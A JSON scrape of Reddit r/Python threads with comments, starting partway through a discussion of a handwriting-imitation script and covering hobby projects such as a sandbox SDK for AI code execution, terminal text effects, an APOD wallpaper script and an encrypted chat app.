                            "content": "Could randomly combine each of the 5 variations of each letter to produce an infinite number of variations too"
                        },
                        {
                            "author": "slayer_of_idiots",
                            "score": "15",
                            "content": "fonts allow for multiple variations of letters and can insert them randomly."
                        },
                        {
                            "author": "truh",
                            "score": "7",
                            "content": "I think letters in handwriting typically look a bit different depending on which letters come before and after."
                        }
                    ]
                },
                {
                    "author": "NaanFat",
                    "score": "27",
                    "content": "gotta look into opentype fonts for ligatures and alternates"
                },
                {
                    "author": "Kirk10kirk",
                    "score": "27",
                    "content": "Pens don’t lay down ink evenly, also people vary the pressure on the pen"
                },
                {
                    "author": "BovineLightning",
                    "score": "12",
                    "content": "I think it depends what you’re using this for. A high school teacher marking 20-30 pages? Probably gonna notice. A university TA who’s marking potentially 100s? You’d never get caught. As a former TA there was such a time constraint during marking that we were hard pressed to finish all our marking on time."
                },
                {
                    "author": "[deleted]",
                    "score": "3",
                    "content": "An additional challenge will be finding a printer and setting combination that prints in a way that looks like an ink pen / graphite pencil did it. I'm sure it can be done but I've never seen it commercially. You can scan a copy of handwritten papers and tell the difference because printer ink is different (and scanning is imperfect)."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "298",
            "content": "For extra oomph try to make a script that takes 10-20 samples of each letter and randomly selects one from the list"
        },
        {
            "author": "IIIBRaSSIII",
            "score": "327",
            "content": "Definitely looks like a handwriting font to me. But if I saw it printed out, I wouldn't think twice. If you really wanted to fool someone who was skeptical, you'd need to add a few more hand-drawn variations of each letter, and maybe increase the variability in your algorithm as well. Very cool!"
        },
        {
            "author": "negativeaffirmations",
            "score": "151",
            "content": "Really cool project. I'm a graphic designer and have to look at fonts (and match them) all the time, so while this looked off to me at first glance I can't really speak for the average person. Regardless, here are my suggestions for getting it to look \"right\": The variation the y-axis (baseline shift) is a great idea but I think you did it too much. Take down the max variation to maybe 40% of what it's at now. Some of those letters are going way above the baseline. You may want to see if you can do it in a more controlled way so that one letter isn't high above the baseline while the following letter is below the baseline. You could try and get it so that the letters in a whole word or line slowly rise/fall in succession. I noticed the similarities in the letters almost immediately. It becomes very apparent when you look at often used words like \"The\". To fix this, you can make a few more fonts of your handwriting and have the script randomly pick one for each letter. It might be a lot work creating each of those fonts, but that's the simplest way (that I can think of) to address the issue. This one could be unnecessary (that's why I'm putting it last), but you can also try a slight variation in the x-axis (kerning) between the letters. Maybe try applying it randomly to only a quarter of the letters if it looks like it's too much. I hope these suggestions help. Great project. Post again with any updates you choose to make."
        },
        {
            "author": "squirrrrl",
            "score": "31",
            "content": "I think what's slightly suspicious is that none of the letters connect. But you really have to look for it."
        },
        {
            "author": "a1brit",
            "score": "25",
            "content": "OP hasn't responded to anything yet, but instead of random movement this would be a great use of Perlin Noise. To make it move but with more sense that just raw random."
        },
        {
            "author": "SpAAAceSenate",
            "score": "38",
            "content": "The biggest problem is that it's fairly easy to distinguish between printer ink and pen ink. This won't fool anyone whose paying attention. Then again, I can't imagine any legitimate reason to require something be hand written, so..."
        },
        {
            "author": "[deleted]",
            "score": "24",
            "content": "Looks really good to me. I thought it was handwriting until I read the title. Hard too tell unless you specifically look for it."
        },
        {
            "author": "bartosaq",
            "score": "7",
            "content": "Add some variability for X coordinates plus a bit of variance in size and skewness and you are good to go."
        },
        {
            "author": "nobody01810",
            "score": "7",
            "content": "Can I have the script please?"
        }
    ]
},
{
    "post_author": "mlejva",
    "post_id": "1czr85u",
    "post_score": "0",
    "post_time": "Friday, May 24, 2024 at 9:08:51 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "We built open-source SDK for adding custom code interpreters to AI apps",
    "media": [
        "https://jupyter-client.readthedocs.io/en/latest/messaging.html",
        "https://e2b.dev/",
        "https://e2b.dev/docs",
        "https://github.com/e2b-dev/code-interpreter",
        "https://github.com/e2b-dev",
        "https://github.com/firecracker-microvm/firecracker",
        "https://github.com/e2b-dev/e2b-cookbook"
    ],
    "post_content": "What My Project Does\nHey everyone! I'm the CEO of the company that built an SDK that makes it easy to build custom code interpreters for AI apps.\nWe're a company called E2B [0]. We're building and open-source [1] secure environments for running untrusted AI-generated code and AI agents. We call these environments sandboxes and they are built on top of micro VM called Firecracker [2]. We specifically decided to use Firecrackers instead of containers because of their security and ability to do snapshots.\nYou can think of us as giving small cloud computers to LLMs.\nWe recently created a dedicated SDK for building custom code interpreters in Python or JS/TS. We saw this need after a lot of our users have been adding code execution capabilities to their AI apps with our core SDK [3]. These use cases were often centered around AI data analysis so code interpreter-like behavior made sense\nThe way our code interpret SDK works is by spawning an E2B sandbox with Jupyter Server. We then communicate with this Jupyter server through Jupyter Kernel messaging protocol [4]. Here's our cookbook showing how to add code interpreter to different models [5].\nWe don't do any wrapping around LLM, any prompting, or any agent-like framework. We leave all of that to our users. We're really just a boring code execution layer that sits at the bottom. We're building for the future software that will be building another software.\nOur long-term plan is to build an automated AWS for AI apps and agents where AI can build and deploy its own software while giving developers powerful observability into what's happening inside our sandboxes. With everything being open-source.\nHappy to answer any questions and hear feedback!\nTarget Audience You can use it in production. We have companies using us in production already.\nComparison Alternatives we usually see are serverless functions or Docker containers. Both have security issues. With serverless functions you can leak data between users and with containers you don't really have true isolation. Containers were made for packaging and portability, not security.\nLinks\nhttps://github.com/e2b-dev/code-interpreter\n[0] https://e2b.dev/\n[1] https://github.com/e2b-dev\n[2] https://github.com/firecracker-microvm/firecracker\n[3] https://e2b.dev/docs\n[4] https://jupyter-client.readthedocs.io/en/latest/messaging.html\n[5] https://github.com/e2b-dev/e2b-cookbook",
    "comments": [
        {
            "author": "Superidolwithcoke",
            "score": "1",
            "content": "man is into ai way too much"
        }
    ]
},
{
    "post_author": "Brilliant_Emphasis63",
    "post_id": "1czxc2a",
    "post_score": "65",
    "post_time": "Saturday, May 25, 2024 at 1:36:11 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PyPods: A lightweight solution to execute Python dependencies in an isolated fashion.",
    "media": [
        "https://github.com/Rohan2002/pypods",
        "https://github.com/babashka/pods"
    ],
    "post_content": "Introducing PyPods\nWhat My Project Does\nA Python library designed to manage monolithic project architectures by isolating dependencies.\nTraditionally, monolithic architectures cluster all dependencies into one project, creating complexities and potential conflicts. PyPods offers a solution by isolating these dependencies and enabling the main project to communicate with them via remote procedure calls.\nThis approach eliminates the need to install dependencies directly in the main project. Feel free to take a look and I am happy to receive some feedback!\nTarget Audience\nProduction grade.\nComparison\nThis solution is inspired by Babashka pods in the Clojure world.",
    "comments": [
        {
            "author": "KrazyKirby99999",
            "score": "14",
            "content": "This seems very unsafe (reliability, not security). This might help if the incompatible change in Dependency A between v0.5 and v1.0 is something that is not used by the main project. However, in many cases the incompatibility described by the package version is neccesary. If you try to provide something from v0.5 as input to a v1.0 function, there may be conflicts. This would be similar to using different versions of the same API at the same time. Edit: See https://www.reddit.com/r/Python/comments/1czxc2a/comment/l5mlyrg/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button",
            "replies": [
                {
                    "author": "tomster10010",
                    "score": "8",
                    "content": "i don't disagree but the reasoning here is that you don't use A@1.0 and A@0.5, you use A@1.0 and B, which internally uses A@0.5 - you aren't passing objects from A@1.0 to A@0.5",
                    "replies": [
                        {
                            "author": "Brilliant_Emphasis63",
                            "score": "-4",
                            "content": "Actually I agree with Tomster, but I want to also comment about Krazy’s scenario: let’s say main project uses Dependency A(v1.0) and A(v1.0) uses A(v0.5). Then we can create a pod from A(v1.0) that contains A(v0.5) and then don’t have to worry about installing A(v0.5) in A(v1.0).",
                            "replies": [
                                {
                                    "author": "ivosaurus",
                                    "score": "13",
                                    "content": "Why would A use a different version of itself? Maybe you mean to use two different letters?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "tomster10010",
            "score": "4",
            "content": "your transparent pngs do not look good in github dark mode",
            "replies": [
                {
                    "author": "Brilliant_Emphasis63",
                    "score": "6",
                    "content": "I can create the diagrams for the dark mode. I use white mode, so i didn’t think of that scenario. Thank you for pointing it out."
                },
                {
                    "author": "Brilliant_Emphasis63",
                    "score": "4",
                    "content": "I have updated the background colors now."
                }
            ]
        },
        {
            "author": "ivosaurus",
            "score": "5",
            "content": "creating complexities and potential conflicts. Can you list a real world example of such a conflict you've found?",
            "replies": [
                {
                    "author": "1010012",
                    "score": "5",
                    "content": "Not OP, but I run into this all the time. It's especially problematic in the world of language models. Some libraries will often want a very specific version of a dependency."
                },
                {
                    "author": "Brilliant_Emphasis63",
                    "score": "5",
                    "content": "In my past work in some organizations, we had a main project and many dependencies in that project. Those dependencies used maybe different versions of Numpy or some dependencies only ran using Python 3.6 and below, while some ran Python 3.7 and above. The abstraction using PyPods will solve that issue by isolating the main project's dependencies in its pod. Every pod has its own Python interpreter and dependencies."
                }
            ]
        },
        {
            "author": "marr75",
            "score": "3",
            "content": "To summarize for people that don't get it, this is accomplishing something other runtimes can do natively and it would be a nice feature in Python. In .net, it's called \"multi-targeting\". The overhead of multiple interpreter makes it of less interest to me but I admire the attempt. Another comment claims it is unsafe because A could depend on B1.0 and C1.0 but B1.0 could depend on C2.0. This only matters if C is part of B's public interface that A consumes. I don't know the range of RPC supported but the pods probably shouldn't export internals of the packages for this reason. In .net multi-targeting, A could not compile depending on C1.0, B would force its C2.0 dependency on A. Python is a little more flexible but generally, I'd recommend users either: Don't use or create packages that expose third party types in their public interface OR enforce the same restriction as in .net multi-targeting and insist the consumer depends on the same version of any publicly exposed third party types"
        },
        {
            "author": "chakan2",
            "score": "5",
            "content": "Why? A venv is already a solid solution. It's stuff like this that's turning Python into Javascript."
        }
    ]
},
{
    "post_author": "XUtYwYzz",
    "post_id": "1d28djq",
    "post_score": "188",
    "post_time": "Tuesday, May 28, 2024 at 5:00:01 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "TerminalTextEffects (TTE) - A terminal visual effects engine, application, and library.",
    "media": [
        "https://chrisbuilds.github.io/terminaltexteffects/showroom/",
        "https://github.com/ChrisBuilds/terminaltexteffects"
    ],
    "post_content": "I saw the words 'visual effects', just give me GIFs\nUnderstandable, visit the Effects Showroom first. Then come back if you like what you see.\nWhat My Project Does\nTerminalTextEffects (TTE) is a terminal visual effects engine. TTE can be installed as a system application to produce effects in your terminal, or as a Python library to enable effects within your Python scripts/applications. TTE includes a growing library of built-in effects which showcase the engine's features.\nUse cases:\nInvoke at terminal launch to produce an animation (ex: fetch).\nAlias system commands to animate output.\nInvoke on SSH session to blow people's minds when they log in.\nUse in your project to produce animated prompts, logos, etc.\nTarget Audience\nTTE is a terminal toy (and now a Python library) that anybody can use to add visual flair to their terminal or projects. It works best in Linux but is functional in the new Windows Terminal.\nEvery effect allows for significant customization including color gradient stops and directions as well as many effect-specific options. Customization is exposed via command-line arguments and through the Config class interface. The effect examples shown in the documentation represent a single configuration. Your experience can be very different with a little tweaking to match your system theme and preferences.\nComparison\nI don't know of any other projects like TTE. It's a completely useless and over-engineered side-project that's turned into a whole thing. Have fun.\nMore Info\nThe GitHub README has some effect examples, installation instructions and some basic quick-start info.",
    "comments": [
        {
            "author": "phira",
            "score": "25",
            "content": "That looks super fun, nice work! bookmarked for some future completely useless and over-engineered side-project of mine that needs a bit of extra fun :)"
        },
        {
            "author": "XUtYwYzz",
            "score": "16",
            "content": "Automod keeps trapping this post if I add the following info, so I'll drop it here as a comment. More Info The GitHub README has some effect examples, installation instructions and some basic quick-start info. Visit the Documentation for more detailed instructions and reference material. Check out the Effects Showroom to see all of the included effects. TTE now has a Change[B]log where you can keep up with releases and learn a bit more about the engine and effects. More More Info If you have ideas for engine features or new effects or encounter any bugs, raise an issue. I welcome feedback and interaction. Note: I'm currently working on effect building tutorials and documenting the engine beyond reference material. It's mostly a one dev show (a hobbyist, at that) with very little time each week. At this time, a v1.0 roadmap will include support for effect plugins and have a stable engine API.",
            "replies": [
                {
                    "author": "janpjens",
                    "score": "3",
                    "content": "Impressive stuff! So rad. But how did you manage to get the 3D effect after black hole effect shown on top of the \"Intro to TTE\" page? Some other package combined with TTE or simply a well colored figlet? Keep up the good work.",
                    "replies": [
                        {
                            "author": "XUtYwYzz",
                            "score": "1",
                            "content": "In that case the input text was ASCII art generated here: https://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20"
                        }
                    ]
                }
            ]
        },
        {
            "author": "BuonaparteII",
            "score": "11",
            "content": "Wow! Many are impressive but I was not expecting the Spotlights one"
        },
        {
            "author": "Winter-Journalist993",
            "score": "7",
            "content": "This is awesome, man! Great work!"
        },
        {
            "author": "Orio_n",
            "score": "5",
            "content": "Is there anyway to make custom effects leveraging the already present tools in the library or is it only capable of animating the baked in effect? I'd like to create my own terminal version of a splash screen for when my application is starting but don't want to create it from scratch",
            "replies": [
                {
                    "author": "XUtYwYzz",
                    "score": "5",
                    "content": "The last major milestone is to build the effect writing tutorials and document the engine API in explanatory style. TTE is an engine, ultimately, so writing custom effects is half the point. It's an ongoing process and high priority."
                }
            ]
        },
        {
            "author": "ryanstephendavis",
            "score": "7",
            "content": "This is super rad😆 ... It would be fun to alias some of these in my bashrc to display text files"
        },
        {
            "author": "Parking-Chemistry-15",
            "score": "3",
            "content": "This is neat. Glad projects like this and the work out of https://github.com/charmbracelet are keeping the terminal fun."
        },
        {
            "author": "IlIlIlIIlMIlIIlIlIlI",
            "score": "3",
            "content": "this looks insanely cool. Huge respect!!!!"
        },
        {
            "author": "clawjelly",
            "score": "4",
            "content": "I guess the next cyberpunk roguelike will be rad!"
        }
    ]
},
{
    "post_author": "AirHamyes",
    "post_id": "ebjgvl",
    "post_score": "2324",
    "post_time": "Monday, December 16, 2019 at 10:02:56 PM GMT+3",
    "flair_text": "",
    "post_title": "I wrote a program that doodles things in MS Paint!",
    "media": [
        "https://www.reddit.com/r/generative/",
        "https://www.reddit.com/r/generative/comments/eb5vge/i_made_a_program_that_doodles_things_in_ms_paint/",
        "https://external-preview.redd.it/yQ6W2di0J-Ed9AOuntVVTLRShnnLrfxf5hH_d_Xe-rM.png?width=640&crop=smart&format=pjpg&auto=webp&s=107c592f863fa92d11b38ed67f670978e6828475"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "kpook11",
            "score": "279",
            "content": "So this is how they make the 90s designs for bus seats",
            "replies": [
                {
                    "author": "evilMTV",
                    "score": "11",
                    "content": "It was manually done then though.",
                    "replies": [
                        {
                            "author": "potato1sgood",
                            "score": "11",
                            "content": "Brb, gonna manually parse the algorithm."
                        }
                    ]
                }
            ]
        },
        {
            "author": "covabishop",
            "score": "468",
            "content": "If you named it anything other than pycasso I swear to Moses I'll come over and ctrl-r it myself"
        },
        {
            "author": "AirHamyes",
            "score": "48",
            "content": "Here's the sauce code https://pastebin.com/98EWgWyq"
        },
        {
            "author": "ned334",
            "score": "49",
            "content": "$120.000 modern art piece"
        },
        {
            "author": "[deleted]",
            "score": "11",
            "content": "Jackson Pollock wants to know your location"
        },
        {
            "author": "dugindeep",
            "score": "18",
            "content": "Code please? Is it open source?"
        },
        {
            "author": "ddensa",
            "score": "6",
            "content": "Would be interesting to mix this idea to some kind of DL or ML technic to evolve the painting, like keep doing the strokes but start using patterns, shadows... Etc"
        },
        {
            "author": "69shaolin69",
            "score": "4",
            "content": "PYautogui?"
        },
        {
            "author": "JustSoManyCups420",
            "score": "7",
            "content": "Name it the ‘Jackson pollock bot’"
        }
    ]
},
{
    "post_author": "Potato_eating_a_dog",
    "post_id": "1cz43o6",
    "post_score": "45",
    "post_time": "Friday, May 24, 2024 at 12:22:34 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a small Python script that uses NASA'S APOD API to set cool backgrounds on a Windows machine",
    "media": [
        "https://github.com/william7491681/APOD_Wallpaper_Script"
    ],
    "post_content": "https://github.com/william7491681/APOD_Wallpaper_Script\nWhat my project does\nNASA has a ton of accessible API's, one of which being the APOD (Astronomy Picture Of the Day) API. I made a script to get the last 9 pictures of the day and set them as my Windows 10 background, and then used task scheduler to have the script re-run every day at noon and whenever the computer boots up.\nIt's fairly hard coded for my setup (specific file paths, 1920x1080 monitor, etc), but it shouldn't be too hard to change if one wanted to.\nTarget audience\nAnyone who likes space backgrounds\nComparison\nIdk, automod made me put this section",
    "comments": [
        {
            "author": "Theonetheycallgreat",
            "score": "4",
            "content": "Haha, nice! I did the same thing, but with r/earthporn"
        },
        {
            "author": "7_hole",
            "score": "1",
            "content": "It could ne a good idea to leave each user specified his own path",
            "replies": [
                {
                    "author": "Potato_eating_a_dog",
                    "score": "1",
                    "content": "Yeah, I wasn't planning on doing anything of the sort at first, but it didn't take too long to add something like that in. I just made a quick update."
                }
            ]
        },
        {
            "author": "TeamDman",
            "score": "1",
            "content": "Nice! Great readme"
        },
        {
            "author": "Zestyclose_Profile27",
            "score": "1",
            "content": "Sometimes I feel, APIs are real beneficial and super cool"
        }
    ]
},
{
    "post_author": "aoeu512",
    "post_id": "1cxp7qe",
    "post_score": "5",
    "post_time": "Wednesday, May 22, 2024 at 5:07:42 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Programmable Semantics (Eval, Semicolon, Assignment) for Python",
    "media": [],
    "post_content": "I've seen programmable semantics (eval-hacking, macros) in LISPs and in Haskell-likes(Monads/Template Haskell), the overall techinque in OOP languages is called \"Aspect Oriented Programming\". Has this kind of thing been discussed before, and is it Pythonic it could allow a lot of Python code to be shorter. Python has sys.set_trace that sort of allows some form of programmable semantics but its mostly for debugging.\nProgrammable assignment(variables) are like setters/getters/properties, but instead of being run on o.x = 5, you could run them on \"all local assignments\" isnside a context manager or in a decorated function. On every assignment you could do stuff like log the values, update dependencies, notify objects, do a database transaction, do persistance, calculate other values, without having to explicitly do so for every assignment statement.\nProgrammable semicolons (such as Haskell Monads, or reprogramming Lisp do/progn/let) could allow you to have the same code run either synchronous, async, get undo/history support, break on error, rollback, logging in between lines, changing local/global variables in between each line, database access in between lines, checking values for errors, ignoring certain statements, etc... You can think of a semicolon like an \"unrolled for loop\"/iterator ran for each code line. It would be like async but you can change a piece of code to be sync or async at run time by changing the context manager you are in. Programmable \"call\" can change the default call operation in a context manager for all functions and be similar to semicolons.\nProgrammable eval would allow you to change the order of operations, choose to ignore certain functions, allow you replace certain expensive expressions with others, allow you to keep a trace of all evaluations taking place, you can turn an expression/program into an interator allowing you to pretty cool stuff.",
    "comments": [
        {
            "author": "mechamotoman",
            "score": "8",
            "content": "Python has some pretty powerful meta programming facilities, but nothing even close to lisp and Haskell in that regard. You might be interested in https://github.com/Technologicat/unpythonic"
        },
        {
            "author": "ExoticMandibles",
            "score": "8",
            "content": "Python traditionally sacrifices power in the name of flexibility. If Joe Random Programmer reads your code today, they understand what it does. If you've reprogrammed assignment, semicolons, and variables in your corner of the project, changing the semantics of existing Python syntax, then Joe needs significantly more context to understand your code--and anybody else's code. Yes, Python has some support for changing behavior, __getattribute__ and __add__ and so on. I observe these are used sparingly and--generally--idiomatically. (Personally I was a little alarmed when I saw the pathlib Path object had overloaded __div__ to really mean os.path.join. But I can see how it would be irresistable.)",
            "replies": [
                {
                    "author": "Looploop420",
                    "score": "9",
                    "content": "That Path / thing really threw me when I first saw it, but now I am addicted to it"
                },
                {
                    "author": "DuckDatum",
                    "score": "4",
                    "content": "rhythm grandfather rob distinct straight door disarm salt imminent wise This post was mass deleted and anonymized with Redact"
                },
                {
                    "author": "Severe_Inflation5326",
                    "score": "1",
                    "content": "Python is pretty good at allowing you to change semantics, but not syntax. We have meta classes and __new__ that lets you do truly weird things. People don't generally go around using them in random projects. However, they are used in libraries to provide a better experience to the library users. And there, it becomes part of the documentation of the rest of the semantics of that library. In general, there is no guarantee what the return value of any operator between unknown types is. And that is fine!"
                }
            ]
        },
        {
            "author": "Igggg",
            "score": "3",
            "content": "Your title is misleading (or, alternatively, hard to understand). \"Semantics\" refers to the logic of your code (versus, say, syntax, that refers to the rules following its organization). All semantics is programmable, in every language. What you meant was \"operator overloading\", which is already implemented in Python through magic methods. Not everything can be overloaded, however; the semantics of len can, but that of eval cannot.",
            "replies": [
                {
                    "author": "EmployerSmooth7856",
                    "score": "1",
                    "content": "Semantics is about the meaning of the code—what the code does when it runs. This includes how expressions are evaluated, how statements control the flow of execution, how data structures are manipulated, and what the effect of different constructs is during execution. Semantics refers to the meaning and behavior of the code rather than the logic itself. The assertion \"Semantics refers to the logic of your code\" is extremely vague and not entirely accurate. Logic typically refers to the specific operations and control flow structures (like loops and conditionals) that you use to solve a problem, whereas semantics is about the underlying meaning and behavior of those constructs within the language. While some languages allow users to define or override certain behaviors (like operator overloading in Python), the fundamental semantics of many language constructs are fixed and not changeable by the programmer."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "1",
            "content": "I guess you can write an effects library that allows you to use different effect handlers with the same interface.",
            "replies": [
                {
                    "author": "aoeu512",
                    "score": "1",
                    "content": "This GitHub - orsinium-labs/eff: Python library to work with algebraic effects, looks interesting. The Eff language and related F* language look like the future of programming O_o."
                }
            ]
        }
    ]
},
{
    "post_author": "jackpick15",
    "post_id": "g78ih1",
    "post_score": "2217",
    "post_time": "Friday, April 24, 2020 at 4:37:32 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I wrote a program on python to show how the number of swearwords differs across each breaking bad episode to see if there was any kind of correlation - turns out there isn't and this was a complete flop",
    "media": [
        "https://preview.redd.it/sx843xk7qru41.png?width=640&crop=smart&auto=webp&s=643c829ad27dfacb2a86fb982c494bc7df4481d4",
        "https://i.redd.it/sx843xk7qru41.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "NoWayRay",
            "score": "691",
            "content": "Even the lack of correlation is still valid data though. Your experiment wasn't a flop, it just yielded different data to what you may have expected.",
            "replies": [
                {
                    "author": "zacharypamela",
                    "score": "335",
                    "content": "Null hypothesis confirmed yet again!",
                    "replies": [
                        {
                            "author": "curohn",
                            "score": "105",
                            "content": "That fucker needs to take a break. He wins so often"
                        },
                        {
                            "author": "putsandcalls",
                            "score": "63",
                            "content": "Null is never confirmed... you just failed to reject the null :p, important distinction to the statistician"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "34",
                    "content": "Good point. No proper experiment is a ever a failure.",
                    "replies": [
                        {
                            "author": "grnngr",
                            "score": "35",
                            "content": "Tell that to my thesis advisor."
                        }
                    ]
                },
                {
                    "author": "jackpick15",
                    "score": "18",
                    "content": "Thankyou, I have learned quite a bit from it as well",
                    "replies": [
                        {
                            "author": "NoWayRay",
                            "score": "5",
                            "content": "Good stuff! That's the best result of all, friend."
                        }
                    ]
                }
            ]
        },
        {
            "author": "AlarmingBarrier",
            "score": "194",
            "content": "Try swear words versus IMDb ranking"
        },
        {
            "author": "[deleted]",
            "score": "54",
            "content": "You should try it with South Park"
        },
        {
            "author": "[deleted]",
            "score": "134",
            "content": "This should be a bar chart because there's no natural transition between episodes. 2) There's no correlation to prove. You might be looking for a trend over time but you haven't provided anything else to correlate with except time. You might graph the screen time of a particular character or the number of murders, for example, and try to correlate that with swear words."
        },
        {
            "author": "petdance",
            "score": "35",
            "content": "It's not a flop. You discovered that there was no correlation that you could discern. That answered a question you had. Now, since this is r/python, please show the code. Otherwise it's just a graph."
        },
        {
            "author": "[deleted]",
            "score": "5",
            "content": "Sure, there may not be a correlation with episode number but what about writers?"
        },
        {
            "author": "chinguetti",
            "score": "4",
            "content": "Where did you get the list of swearwords?"
        },
        {
            "author": "s_arme",
            "score": "4",
            "content": "Did you share it on GitHub ?!"
        },
        {
            "author": "80-20RoastBeef",
            "score": "4",
            "content": "Am I crazy cause I see a slight downward trend in your data. I can't verify if mathematically but the graph look like an ever so slight decline."
        },
        {
            "author": "64n3",
            "score": "4",
            "content": "You found no correlation of swear words and episode. But you could try to correlatw this data to other data. For example how many characters died that episode, screen time of certain characters (this is where I'd put my money to find some correlations) or hell, literally anything you can put into numbers. Put together a set of features, extract them and plot a correlation matrix, you might just be surprised of the outcome!"
        }
    ]
},
{
    "post_author": "SuperMB13",
    "post_id": "1d28wkf",
    "post_score": "137",
    "post_time": "Tuesday, May 28, 2024 at 5:28:13 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Preferred method to run python in VS Code",
    "media": [],
    "post_content": "Been working on a python tool for VS Code. Curious to get peoples' opinion on how they run python files (not notebooks) within VS Code. Do you typically run files python by:\nTyping the python command into the integrated terminal\nClicking the run button at the top of the file\nPressing F5 for debugging\nPressing Ctrl+F5 for run but not debug\nCreating a custom keyboard shortcut\nOther\nLet me know your thoughts, I appreciate the insights!",
    "comments": [
        {
            "author": "GinIsMyLoveLanguage",
            "score": "233",
            "content": "Terminal"
        },
        {
            "author": "qckpckt",
            "score": "42",
            "content": "I really like CLIs, and I also tend to use poetry to manage my python project dependencies. My typical VSCode environment creation process for a new python project looks something like this. I create a new miniconda virtual env in the project directory. it’s a very straightforward way to maintain different virtual envs with specific version of python installed. I have poetry installed globally using pipx, so in the newly created env I’ll run poetry init and set up the initial state. I’ll set up a VsCode workspace at this point and then use the command palette to associate the workspace with the python interpreter from my conda env. This means when I open a terminal window in the VSCode workspace, it’ll be in the correct directory and will have the correct conda environment active already. I’ll add a tool.poetry.scripts entry to the poetry generated pyproject.toml that associates a command with my python project entry point. Iastly, I’ll run poetry install. Now, whenever I open this project, my dev environment is already set up and I have a simple cli command that can run the main entry point to the script. That cli command auto reloads by, so it automatically detects changes to the project. If the interface ends up being more than one or two possible arguments, I’ll then add one of my favourite python libraries - Typer. It makes creating professional looking CLIs a breeze. Even if my project isn’t destined to be a CLI, it’s so easy to create commands that I’ll normally use it to provide me with easy ways of testing and interacting with the code. Because typer cli commands are just python functions, a typer cli module can be imported into a new script and called like a regular function. I know I’m a little weird with this - some of my very experienced dev friends think I’m nuts - but when I’m working on a personal project that’s just for me, this is how I do it.",
            "replies": [
                {
                    "author": "dudaspl",
                    "score": "10",
                    "content": "Why use miniconda instead of pyenv which is integrated with poetry? You can even force poetry to create .venv folder in your project root"
                }
            ]
        },
        {
            "author": "BerriesAndMe",
            "score": "70",
            "content": "I mostly run it in a separate dedicated terminal. It ends up being much faster than in the integrated shell of vscode. I use debugging a lot in vscode though as well"
        },
        {
            "author": "[deleted]",
            "score": "14",
            "content": "make files"
        },
        {
            "author": "strangedave93",
            "score": "18",
            "content": "Run button. Then debugger if necessary. The terminal is handy if I need to mess around with command line options or use other tools, but if I was going to just use terminal routinely it makes me wonder why I’d be using VS Code (vs something more focussed on pure text editing than extension via plugins)."
        },
        {
            "author": "someguywhosherenow",
            "score": "9",
            "content": "I do all of these and have had my team add a shortcut to run snippets of code in an interactive notebook with a shift+enter to mimic a notebook. Good to explore and become familiar with all of these any why you’d want them in a particular scenario."
        },
        {
            "author": "PanTheWanderer",
            "score": "13",
            "content": "Launch configs"
        },
        {
            "author": "WJMazepas",
            "score": "4",
            "content": "Pressing F5. Debugging through VScode is really helpful"
        }
    ]
},
{
    "post_author": "Reasonable-Zone-7909",
    "post_id": "1cznlay",
    "post_score": "65",
    "post_time": "Friday, May 24, 2024 at 6:34:39 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a desktop chat app :)",
    "media": [
        "https://github.com/xxzoltanxx/Balvan-Chat"
    ],
    "post_content": "What My Project Does\nHi! This is my first time doing a python project more than a few hours in size.\nI made a chat app which features E2E encryption using a passcode and has a multiclient architecture.\nAll comments are welcome!\nTarget Audience\nIt is just a toy project for my portfolio.\nComparison\nCompared to other chat clients, this one uses a passphrase to encrypt all data, with the passphrase being chosen out of the app, for instance on a dinner.\nBut I think that IRC already has this, so it doesn't differ much XD.\nGit link:\nhttps://github.com/xxzoltanxx/Balvan-Chat",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "Username_RANDINT",
            "score": "10",
            "content": "I don't think you meant to have tk in your requirements. It's this project: https://pypi.org/project/tk/",
            "replies": [
                {
                    "author": "Reasonable-Zone-7909",
                    "score": "4",
                    "content": "Thanks :)"
                }
            ]
        },
        {
            "author": "Important-Airport624",
            "score": "7",
            "content": "Do you know of any good resources to learn to build projects like this and help with overall architecture? I’m in university right now but none of my courses have covered anything like this.",
            "replies": [
                {
                    "author": "brian15co",
                    "score": "6",
                    "content": "just keep building stuff. OP's github for this project is a good resource. \"overall architecture\" will come from exposure to a bunch of these, especially valuable are the ones that don't work well with some learned indication of what was leading to it not working well"
                },
                {
                    "author": "Reasonable-Zone-7909",
                    "score": "3",
                    "content": "https://refactoring.guru/design-patterns was a starting point for me, though this app doesn't use any of them. Generally if you adhere to SOLID principles you should get a well laid out design at the end, no matter the conventional design patterns."
                }
            ]
        },
        {
            "author": "RevolutionaryRain941",
            "score": "5",
            "content": "Nice. It seems you real have a good amount of knowledge on different relationship architecture.",
            "replies": [
                {
                    "author": "Reasonable-Zone-7909",
                    "score": "7",
                    "content": "Thanks! I decided to be very organized when doing this app. I spent time just designing the relationships between different components on paper. This didn't prevent me from having issues with the design midproject though. The GUI is thus unfortunately in the main class because tkinter can only run on the main thread."
                }
            ]
        },
        {
            "author": "Paracausality",
            "score": "2",
            "content": "Nice. I was planning on making something like this for my portfolio too! But mine was going to be in terminal. No GUI. I'll save the link so that I can look at it if I ever have any questions. Thank you!",
            "replies": [
                {
                    "author": "Reasonable-Zone-7909",
                    "score": "4",
                    "content": "Welcome! I like it that it's useful to someone."
                }
            ]
        }
    ]
},
{
    "post_author": "atharvaaalok1",
    "post_id": "1czej7h",
    "post_score": "3",
    "post_time": "Friday, May 24, 2024 at 9:45:00 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "DeepFusion: a highly modular Deep Learning Framework.",
    "media": [
        "https://github.com/atharvaaalok/deepfusion",
        "https://github.com/atharvaaalok/deepfusion-examples",
        "https://github.com/atharvaaalok/deepfusion/tree/main/demo"
    ],
